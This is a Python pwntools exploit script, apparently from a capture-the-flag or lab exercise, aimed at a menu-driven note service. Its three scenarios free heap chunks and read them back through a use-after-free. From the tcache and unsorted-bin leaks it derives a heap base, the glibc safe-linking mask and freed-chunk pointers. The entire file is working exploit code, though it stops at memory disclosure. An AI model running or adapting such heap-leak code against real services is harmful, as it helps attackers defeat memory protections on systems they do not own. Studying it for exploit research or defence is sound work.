#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pwn import context, remote, u64


def menu_send(p, n: int) -> None:
    p.sendline(str(n).encode())


def create(p, title: bytes, size: int, content: bytes) -> None:
    p.recvuntil(b"> ", timeout=3)
    menu_send(p, 1)
    p.recvuntil(b"Title: ", timeout=3)
    p.sendline(title)
    p.recvuntil(b"Size: ", timeout=3)
    p.sendline(str(size).encode())
    p.recvuntil(b"Content: ", timeout=3)
    p.send(content)


def delete(p, idx: int) -> None:
    p.recvuntil(b"> ", timeout=3)
    menu_send(p, 4)
    p.recvuntil(b"Index: ", timeout=3)
    p.sendline(str(idx).encode())


def view(p, idx: int, size: int) -> tuple[bytes, bytes]:
    p.recvuntil(b"> ", timeout=3)
    menu_send(p, 2)
    p.recvuntil(b"Index: ", timeout=3)
    p.sendline(str(idx).encode())
    p.recvuntil(b"Title: ", timeout=3)
    title = p.recvn(0x18)
    p.recvuntil(b"Content: ", timeout=3)
    content = p.recvn(size)
    p.recvuntil(b"\n", timeout=3)
    p.recvuntil(b"> ", timeout=3)
    return title, content


def scenario_tcache_leak(p, size: int) -> None:
    create(p, b"A", size, b"A" * size)
    create(p, b"B", size, b"B" * size)

    delete(p, 0)
    delete(p, 1)

    t0, c0 = view(p, 0, size)
    t1, c1 = view(p, 1, size)

    print("T0_HEX:", t0.hex())
    print("C0_HEX:", c0.hex())
    print("C0_Q1:", hex(u64(c0[:8])))
    print("C0_Q2:", hex(u64(c0[8:16])))

    print("T1_HEX:", t1.hex())
    print("C1_HEX:", c1.hex())
    c1_q1 = u64(c1[:8])
    c1_q2 = u64(c1[8:16])
    print("C1_Q1:", hex(c1_q1))
    print("C1_Q2:", hex(c1_q2))

    # Heuristic calc (hypothesis): key -> heap base -> safe-link mask
    key = u64(c0[8:16])
    heap_base = key & ~0xFFF
    mask = heap_base >> 12
    next_ptr = c1_q1 ^ mask
    print("KEY_GUESS:", hex(key))
    print("HEAP_BASE_GUESS:", hex(heap_base))
    print("SAFE_LINK_MASK_GUESS:", hex(mask))
    print("NEXT_PTR_GUESS:", hex(next_ptr))


def scenario_uaf_basic(p) -> None:
    create(p, b"AAAA", 9, b"BBBBBBBB\n")
    delete(p, 0)
    t0, c0 = view(p, 0, 9)
    print("T0_HEX:", t0.hex())
    print("C0_HEX:", c0.hex())


def scenario_unsorted_leak(p, size: int) -> None:
    # tcache drain for same size bin (7 entries per bin)
    drain_size = size
    for i in range(7):
        create(p, f"T{i}".encode(), drain_size, b"Z" * drain_size)
    for i in range(7):
        delete(p, i)

    # size <= 0x500; after tcache is full, next free should go to unsorted
    create(p, b"L", size, b"A" * size)
    target_idx = 7
    delete(p, target_idx)
    # Avoid hang if freed note size field is corrupted; read only a prefix then resync.
    p.recvuntil(b"> ", timeout=3)
    menu_send(p, 2)
    p.recvuntil(b"Index: ", timeout=3)
    p.sendline(str(target_idx).encode())
    p.recvuntil(b"Title: ", timeout=3)
    t0 = p.recvn(0x18)
    p.recvuntil(b"Content: ", timeout=3)
    read_len = min(size, 0x40)
    c0 = p.recvn(read_len)
    p.recvuntil(b"> ", timeout=3)
    print("T0_HEX:", t0.hex())
    print("C0_HEX_16:", c0[:16].hex())
    print("C0_Q1:", hex(u64(c0[:8])))
    print("C0_Q2:", hex(u64(c0[8:16])))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9001)
    parser.add_argument(
        "--scenario",
        choices=["tcache_leak", "uaf_basic", "unsorted_leak"],
        default="tcache_leak",
    )
    parser.add_argument("--size", type=lambda x: int(x, 0), default=0x30)
    args = parser.parse_args()

    context.log_level = "error"
    try:
        p = remote(args.host, args.port)
    except Exception as exc:
        print(f"connect failed: {exc}")
        return

    try:
        if args.scenario == "tcache_leak":
            scenario_tcache_leak(p, args.size)
        elif args.scenario == "unsorted_leak":
            scenario_unsorted_leak(p, args.size)
        else:
            scenario_uaf_basic(p)
    except Exception as exc:
        print(f"run failed: {exc}")
    finally:
        p.close()


if __name__ == "__main__":
    main()
